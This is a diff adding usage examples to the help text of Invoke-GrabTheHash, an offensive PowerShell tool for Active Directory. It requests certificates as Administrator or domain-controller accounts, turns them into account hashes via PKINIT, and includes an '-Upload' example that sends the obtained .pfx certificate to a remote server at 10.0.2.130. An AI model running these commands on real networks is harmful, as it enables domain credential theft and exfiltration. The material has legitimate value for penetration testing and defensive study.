@@ -9,33 +9,44 @@ uses PKINIT to obtain a TGT for the same Account, then performs the UnPAC-the-Ha
 
 .PARAMETER Domain
 Specify the target domain
+Invoke-GrabTheHash -Domain ferrari.local
 
 .PARAMETER CertTemplates
 Enumerate for Certificate Templates
+Invoke-GrabTheHash -CertTemplates
 
 .PARAMETER TemplateName
 Specify a Certificate Template to use
+Invoke-GrabTheHash -TemplateName User
 
 .PARAMETER CAName
 Specify the Certificate Authority Name
+Invoke-GrabTheHash -CAName "CA01.ferrari.local\ferrari-CA01-CA"
 
 .PARAMETER CN
 Specify the Account Client Name
-
-.PARAMETER PFX
-Provide a previously obtained .pfx to get the account hash
-
-.PARAMETER Upload
-Upload .pfx file to a server
+Invoke-GrabTheHash -CN Administrator
 
 .PARAMETER Machine
 Work with Machine Accounts TGTs and Certificates (needs to run in elevated context)
+Invoke-GrabTheHash -Machine
 
 .PARAMETER DC
-If working with a DC Machine Account (-Machine switch is needed)
+If working with a DC Machine Account
+Invoke-GrabTheHash -Machine -DC
+
+.PARAMETER Upload
+Upload .pfx file to a server
+Invoke-GrabTheHash -Upload http://10.0.2.130/Documents/
 
 .PARAMETER Break
 Stop before grabbing the Hash
+Invoke-GrabTheHash -Break
+
+.PARAMETER PFX
+Provide a previously obtained .pfx to get the account hash
+Provide the full path to the .pfx file, as well as the CN and Domain information
+Invoke-GrabTheHash -PFX C:\Users\Senna\Downloads\Administrator.pfx -Domain ferrari.local -CN Administrator
 #>
 
 function Invoke-GrabTheHash
